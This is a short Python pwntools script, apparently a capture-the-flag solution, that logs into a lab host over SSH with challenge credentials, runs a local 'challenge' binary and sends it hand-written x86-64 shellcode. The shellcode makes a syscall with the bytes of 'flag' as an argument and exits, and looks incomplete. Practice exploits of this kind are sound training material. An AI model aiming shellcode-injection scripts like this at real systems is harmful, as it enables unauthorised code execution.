from pwn import *

context.arch = "amd64"

s = ssh(host='192.168.191.128', port=2222, user='ctf', password='ready2play')
p=s.process('./challenge')

p.recv(5000)
shellcode = asm("""

.global _start

_start:
mov rax, 3
mov rdi, 0x67616c66
xor rsi,rsi
syscall

mov rax, 60
xor rdi,rdi
syscall

""")

p.send(shellcode)
p.interactive()

